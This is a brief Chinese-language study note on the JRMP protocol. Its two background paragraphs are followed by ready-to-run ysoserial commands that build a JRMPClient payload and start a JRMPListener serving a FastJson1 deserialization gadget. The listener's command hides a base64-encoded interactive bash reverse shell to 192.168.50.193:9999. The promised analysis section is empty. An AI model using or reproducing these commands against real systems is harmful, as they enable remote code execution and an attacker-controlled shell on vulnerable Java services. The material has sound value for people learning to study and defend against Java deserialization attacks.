# JRMP总结

## 1.JRMP

JRMP是Java远程方法协议，该协议基于TCP/IP之上，RMI协议之下，使用RMI协议的时传递的底层使用的JRMP，JRMP协议底层是基于TCP/IP。

RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议，当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI进行实现的。



## 2.使用方式

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "192.168.50.193:8888" | base64
```







```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 FastJson1 "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNTAuMTkzLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

## 3.原理分析

